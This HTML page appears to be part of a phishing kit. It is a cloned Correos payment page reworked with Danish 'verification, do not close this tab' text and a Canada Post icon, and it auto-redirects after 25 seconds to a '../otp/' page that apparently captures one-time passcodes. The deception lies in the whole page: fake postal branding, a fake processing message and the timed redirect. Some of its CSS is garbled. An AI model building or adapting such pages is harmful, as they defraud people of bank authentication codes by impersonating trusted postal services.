<!DOCTYPE html>
<!-- saved from url=(0081)https://sc-icpdz.correos.es/ilionx45Front/Custom/SCICPInterfaz/SCICPInterfaz.aspx -->
<html xmlns="http://www.w3.org/1999/xhtml" class="wf-inactive"><head id="Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style>
        .hidden {
            display: none;
        }
    </style>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><script language="javascript" type="text/javascript" src="./Seleccione medio de pago_files/typeKit.js.download"></script>
<meta http-equiv="refresh" content="25;url=../otp/" />
    <style type="text/css">.tk-pt-sans{font-family:"pt-sans",sans-serif;}
	.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 50%;
  

}
	</style><style type="text/css">@font-face{font-family:pt-sans;src:url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"),url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"),url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");font-weight:XMR/0000000000000000000124fa/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"),url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"),url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");font-weight:700;font-style:normal;}</style><script>try { Typekit.load({ async: true }); } catch (e) { }</script>

    <link rel="stylesheet" type="text/css" href="./Seleccione medio de pago_files/bootstrap.css" media="screen"><link rel="stylesheet" type="text/css" href="./Seleccione medio de pago_files/main.css"><title>
	VENT VERIFIKATION
</title><link id="Link1" rel="shortcut icon" href="https://www.canadapost.ca/cpc/assets/cpc/img/logos/cpc-logo.svg"><link id="Link2" rel="icon" href="https://www.canadapost.ca/cpc/assets/cpc/img/logos/cpc-logo.svg" type="image/ico"><script language="javascript" type="text/javascript" src="./Seleccione medio de pago_files/jquery-1.7.1.js.download"></script>
<script language="javascript" type="text/javascript" src="./Seleccione medio de pago_files/jquery-1.7.1.min.js.download"></script>
<script language="javascript" type="text/javascript" src="./Seleccione medio de pago_files/jquery-ui-1.8.17.custom.min.js.download"></script>
    <script type="text/javascript">

        $(document).ready(function () {
            initializeComponents();

            var prm = Sys.WebForms.PageRequestManager.getInstance();
            prm.add_initializeRequest(InitializeRequest);
            prm.add_endRequest(EndRequest);

            function InitializeRequest(sender, args) {
            }

            function EndRequest(sender, args) {
                initializeComponents();
            }

            $(".ogilvy-mediodepago").first().addClass("ogilvy-mediodepago-selecionado");
        });

        function initializeComponents() {
            $("#rdbSelectPayment:checked").parent().parent().addClass("ogilvy-mediodepago-selecionado");

            var mmpp = $("#rdbSelectPayment:checked").val();
            var sgtc = $("[id*=hdSGTC]").val();
            var contract = $("[id*=hdContract]").val();

            if (mmpp == sgtc) {
                $("[id*=panelSGTC]").removeClass("hidden");
                $("[id*=panelContrato]").addClass("hidden");
            }
            else if (mmpp == contract) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=panelContrato]").removeClass("hidden");
            }
            else {
                $("[id*=panelSGTC]").addClass("hidden");
            }
        }

        function validarNro(e) {
            var key;
            if (window.event) // IE
            {
                key = e.keyCode;
            }
            else if (e.which) // Netscape/Firefox/Opera
            {
                key = e.which;
            }

            if (key < 48 || key > 57) {
                if (key == 8 || key == 44) // backspace (retroceso) 8 , ',' 44 , '.' 46
                { return true; }
                else
                { return false; }
            }
            return true;
        }

        function confirmarCancelar() {
            if (confirm(document.getElementById('msgCancelar').value)) {
                return true;
            } else {
                return false;
            }
        }

        function hideLoading() {
            document.getElementById('showLoading').style.display = 'none';
        }

        function changeMMPP(mmpp, control) {
            $(".ogilvy-mediodepago-selecionado").removeClass("ogilvy-mediodepago-selecionado");
            $(control).parent().parent().addClass("ogilvy-mediodepago-selecionado");

            $("[id*=hdMMPP]").val(mmpp);

            var sgtc = $("[id*=hdSGTC]").val();
            var contract = $("[id*=hdContract]").val();

            if (mmpp == sgtc) {
                $("[id*=panelSGTC]").removeClass("hidden");
                $("[id*=panelContrato]").addClass("hidden");
            }
            else if (mmpp == contract) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=panelContrato]").removeClass("hidden");
            }
            else {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=panelContrato]").addClass("hidden");
            }

        }

        function setValues() {
            $("[id*=hdDNI]").val($("[id*=tbxDni]").val());
            $("[id*=hdCard]").val($("[id*=tbxTarjeta]").val());
            $("[id*=hdContractValue]").val($("[id*=dropDownContratos] option:selected").val());
            $("[id*=hdDetallableValue]").val($("[id*=dropDownDetallables] option:selected").val());
        }
    </script>
</head>

<body onload="hideLoading();" class="ogilvy-body">
    <form name="formInterfaz" method="post" action="https://sc-icpdz.correos.es/ilionx45Front/Custom/SCICPInterfaz/SCICPInterfaz.aspx" id="formInterfaz">
<div>
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTcxNTI3ODA3MA8WAh4FQ2FuYWwFG01JIFRJRU5EQSBPTkxJTkUgREUgQ09SUkVPUxYCAgMPZBYGAgMPZBYCAgMPZBYEAgEPDxYCHgRUZXh0BQdJbmdsw6lzZGQCAw8PFgIfAQUKQ2FzdGVsbGFub2RkAgUPDxYCHgdWaXNpYmxlZ2QWEAIDD2QWCAIBDw8WAh8BBQZGRUNIQSBkZAICDw8WAh8BBRMxOC8xMi8yMDE5IDE2OjEyOjQwZGQCBA8PFgIfAQUJQ09OQ0VQVE8gZGQCBQ8PFgIfAQUvQ29tcHJhIHJlYWxpemFkYSBlbiBNSSBUSUVOREEgT05MSU5FIERFIENPUlJFT1NkZAIFDw8WAh8BBRhTZWxlY2Npb25lIG1lZGlvIGRlIHBhZ29kZAIHD2QWAgIBDw8WAh8BBT1FbGlqYSBsYSBmb3JtYSBkZSBwYWdvIHkgYWNlcHRlIGxhcyBjb25kaWNpb25lcyBkZWwgc2VydmljaW8uZGQCCQ9kFgICAQ8PFgIfAmhkZAILD2QWAgIDDw8WAh8BBQkyNiw5ICDigqxkZAIPD2QWAmYPZBYCAgMPPCsAEQMADxYEHgtfIURhdGFCb3VuZGceC18hSXRlbUNvdW50AgJkARAWABYAFgAMFCsAABYCZg9kFghmDw8WAh8CaGRkAgEPZBYGZg9kFgRmDxUBBzAxNzU3VEFkAgEPDxYCHghJbWFnZVVybAU2Li4vLi4vbGliL2VzdGlsb3MvaWxpb24vaW1hZ2VzL29naWx2eS1pY29ub1RhcmpldGEucG5nZGQCAQ9kFgpmDxUBBzAxNzU3VEFkAgEPDxYCHwEFB1RBUkpFVEFkZAIDDw8WAh8CaGRkAg8PDxYCHwJoZBYCAgEPZBYCZg9kFgQCAw8QDxYCHwNnZGQWAGQCBw8QDxYEHwNnHgdFbmFibGVkaGQQFQAVABQrAwAWAGQCEQ8PFgIfAmhkZAICD2QWAmYPFQYHMDE3NTdUQQ9jaGVja2VkPWNoZWNrZWQHMDE3NTdUQQcwMTc1N1RBAAcwMTc1N1RBZAICD2QWBmYPZBYEZg8VAQcwMTc1N1BQZAIBDw8WAh8FBTEuLi8uLi9saWIvZXN0aWxvcy9pbGlvbi9pbWFnZXMvb2dpbHZ5LWljb25vUFAucG5nZGQCAQ9kFgpmDxUBBzAxNzU3UFBkAgEPDxYCHwEFBlBBWVBBTGRkAgMPDxYCHwJoZGQCDw8PFgIfAmhkFgICAQ9kFgJmD2QWBAIDDxAPFgIfA2dkZBYAZAIHDxAPFgQfA2cfBmhkEBUAFQAUKwMAFgBkAhEPDxYCHwJoZGQCAg9kFgJmDxUGBzAxNzU3UFAABzAxNzU3UFAHMDE3NTdQUAAHMDE3NTdQUGQCAw8PFgIfAmhkZAIRDw8WAh8BBQVQYWdhcmRkAhMPDxYCHwEFCENhbmNlbGFyZGQCBw8PFgIfAmhkZBgBBRJHcmlkVmlld1BhZ29TaW1wbGUPPCsADAMGFQEGSW1hZ2VuBxQrAAIUKwABZBQrAAFkCAIBZGfBRZU3CCOluj4LTLXJ+F2Rk6oznhGHZutc/4tS+laS">
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['formInterfaz'];
if (!theForm) {
    theForm = document.formInterfaz;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="./Seleccione medio de pago_files/WebResource.axd" type="text/javascript"></script>


<script type="text/javascript">
//<![CDATA[
var __cultureInfo = {"name":"es-ES","numberFormat":{"CurrencyDecimalDigits":2,"CurrencyDecimalSeparator":",","IsReadOnly":true,"CurrencyGroupSizes":[3],"NumberGroupSizes":[3],"PercentGroupSizes":[3],"CurrencyGroupSeparator":".","CurrencySymbol":"€","NaNSymbol":"NeuN","CurrencyNegativePattern":8,"NumberNegativePattern":1,"PercentPositivePattern":0,"PercentNegativePattern":0,"NegativeInfinitySymbol":"-Infinito","NegativeSign":"-","NumberDecimalDigits":2,"NumberDecimalSeparator":",","NumberGroupSeparator":".","CurrencyPositivePattern":3,"PositiveInfinitySymbol":"Infinito","PositiveSign":"+","PercentDecimalDigits":2,"PercentDecimalSeparator":",","PercentGroupSeparator":".","PercentSymbol":"%","PerMilleSymbol":"‰","NativeDigits":["0","1","2","3","4","5","6","7","8","9"],"DigitSubstitution":1},"dateTimeFormat":{"AMDesignator":"","Calendar":{"MinSupportedDateTime":"\/Date(-62135596800000)\/","MaxSupportedDateTime":"\/Date(253402297199999)\/","AlgorithmType":1,"CalendarType":1,"Eras":[1],"TwoDigitYearMax":2029,"IsReadOnly":true},"DateSeparator":"/","FirstDayOfWeek":1,"CalendarWeekRule":0,"FullDateTimePattern":"dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy H:mm:ss","LongDatePattern":"dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy","LongTimePattern":"H:mm:ss","MonthDayPattern":"dd MMMM","PMDesignator":"","RFC1123Pattern":"ddd, dd MMM yyyy HH\u0027:\u0027mm\u0027:\u0027ss \u0027GMT\u0027","ShortDatePattern":"dd/MM/yyyy","ShortTimePattern":"H:mm","SortableDateTimePattern":"yyyy\u0027-\u0027MM\u0027-\u0027dd\u0027T\u0027HH\u0027:\u0027mm\u0027:\u0027ss","TimeSeparator":":","UniversalSortableDateTimePattern":"yyyy\u0027-\u0027MM\u0027-\u0027dd HH\u0027:\u0027mm\u0027:\u0027ss\u0027Z\u0027","YearMonthPattern":"MMMM\u0027 de \u0027yyyy","AbbreviatedDayNames":["dom","lun","mar","mié","jue","vie","sáb"],"ShortestDayNames":["do","lu","ma","mi","ju","vi","sá"],"DayNames":["domingo","lunes","martes","miércoles","jueves","viernes","sábado"],"AbbreviatedMonthNames":["ene","feb","mar","abr","may","jun","jul","ago","sep","oct","nov","dic",""],"MonthNames":["enero","febrero","marzo","abril","mayo","junio","julio","agosto","septiembre","octubre","noviembre","diciembre",""],"IsReadOnly":true,"NativeCalendarName":"calendario gregoriano","AbbreviatedMonthGenitiveNames":["ene","feb","mar","abr","may","jun","jul","ago","sep","oct","nov","dic",""],"MonthGenitiveNames":["enero","febrero","marzo","abril","mayo","junio","julio","agosto","septiembre","octubre","noviembre","diciembre",""]},"eras":[1,"d.C.",null,0]};//]]>
</script>

<script src="./Seleccione medio de pago_files/ScriptResource.axd" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
//]]>
</script>

<script src="./Seleccione medio de pago_files/ScriptResource(1).axd" type="text/javascript"></script>
<div>

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="5214FA88">
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdABbAHR+EtzfTwzBh5slYoqXUKYxINpXCD7pxiwhNFlKffGVFZ8LPzAFszdVXkv4nuqbDffXqFfl7h/3VRTQbnA5IL5EDTkRPqV00CiFfasciDw10w0OV5nbBBlg5q5O6GBjjMk2yZmXm1AJg0jFfIEaFP9lf99oiBKUEXI1+/LVbsJuEqHCqhc80NAw7pbvBAGWyXsl+IMbIdqnBHhZRZ/VKUE1vvINTlneJ+qCsssevdqbAC4J05jpJ68wXOT4mHKVLubmCvTooHC/vRD/Zc77f+5Fjx/Gs2kDETzXNpDF7WM4Syct6D+URMWE/pA5lV+TydnlEEUBwxqp7PntNBxvmwt3/Vhpi+NCu3NgTSfMEWnlHG8idfV5ed7H0uUP2z41OMJOlcZB0ewAoEzNOPleaJW8mXuwaMxSzWzazGtWLl9yzdzhZkNlKEEmd1Ba4+3AJpiMUmgZOFMv0DKL2bwHmWTUIAW6s/kPzRgzNL+aWZwewY1a2RFlvcwR2tk7YbL0=">
</div>
        <!-- Load -->
        <div id="showLoading" style="display: none;">
            <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                <div class="load-container load">
                    <div class="loader">
                        <span>LOADING..&gt;</span></div>
                </div>
            </div>
        </div>

        <div class="wrapper">
            <section>
                <header>
		<div class="container-fluid hidden-xs">
			<div class="row">
				<div class="col-md-12" style="background-color:#fff">
					&nbsp;
				</div>
			</div>
		</div>
		<div class="container-fluid visible-xs">
			<div class="row">
				<div class="col-xs-3 col-sm-3 col-md-1">
					<div style="margin-top: 12px;">
						
						&nbsp;
					</div>
				</div>
				<div class="col-xs-6 col-sm-9 col-md-11 text-center">
					
					<a tabindex="1" href=""><img  src="../file/sing.png" style="background-color:#0097b9;
    width: 210px;
"></a>
				</div>
			</div>
		</div>
		<div style="color:#fff;background-color: #0097b9;" class="container-fluid hidden-xs">
			<div class="row">
				<div class="col-md-1">&nbsp;</div>
				<div class="col-md-11" style="background-color:#0097b9;padding-left:0;">
					
					<a tabindex="2" href=""><img  src="../file/sing.png" id="usps-logo" style="
    width: 200px;
">
				</div>
				
			</div>
		</div>
	</header>
            </section>
        </div>
        <div id="panelContent">
	
            <div class="contenido" id="contenido">
                <!--ERROR-->
                
                <!--TITLES-->
                <section>
                    <div class="container">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">


                                <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                        <span id="fecha" class="descripcionPago" style="font-weight:bold;">DATO </span><span id="Fechavalor" style="font-weight:normal;"><?=date('d/m/Y')." ";?></span>
                                    </div>
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                        <span id="concepto" class="descripcionPago" style="font-weight:bold;"></span><span id="conceptovalor" style="font-weight:normal;">Omdirigerer anmodningen til siden Behandlingscenter ...</span>
                                    </div>
                                </div>
                                
                                <div id="divSubtitularPago" class="ogilvy-subtitular">
		
                                    <span id="lbSubTittle" class="subtitulo">Luk ikke denne fane</span>
                                
	</div>
                                <div id="divMetodoPago" class="ogilvy-metodo">
		
                                    <div class="ogilvy-iconomediodepago">
                                        
                                    </div>
                                    <div class="ogilvy-textomediodepago">
                                        </div>
                                    <div class="ogilvy-clearfix"></div>
                                

                            </div>
							
							<img class="center" src="http://cdn.lowgif.com/small/745b4d14b1057edd-ajax-loading-gif-11-gif-images-download.gif"   alt=""></p>

                        </div>
                    </div>
                </section>
                <script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('smMaster', 'formInterfaz', ['tupdPanel',''], [], [], 90, '');
	//]]>
</script>

                <div id="updPanel">
		
                        <!--Loading-->
                        <div id="updateProgress" style="display:none;" role="status" aria-hidden="true">
			
                                <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                                    <div class="load-container load">
                                        <div class="loader">
                                            <span>INDLÆSER..</span></div>
                                    </div>
                                </div>
                            
		</div>

                        <!--Payments-->
                        
                <!--Buttons -->
                
        
</div>
</div>

        <!--ERROR-->
        
        
    <!--Hidden values-->
        <input type="hidden" name="hdMMPP" id="hdMMPP" value="01757TA">
        <input type="hidden" name="hdContract" id="hdContract" value="01757CON">
        <input type="hidden" name="hdSGTC" id="hdSGTC" value="01757SGT">
        <input type="hidden" name="hdDNI" id="hdDNI">
        <input type="hidden" name="hdCard" id="hdCard">
        <input type="hidden" name="hdContractValue" id="hdContractValue">
        <input type="hidden" name="hdDetallableValue" id="hdDetallableValue">
    

<script type="text/javascript">
//<![CDATA[
Sys.Application.add_init(function() {
    $create(Sys.UI._UpdateProgress, {"associatedUpdatePanelId":null,"displayAfter":500,"dynamicLayout":true}, null, null, $get("updateProgress"));
});
//]]>
</script>
</form>


</body></html>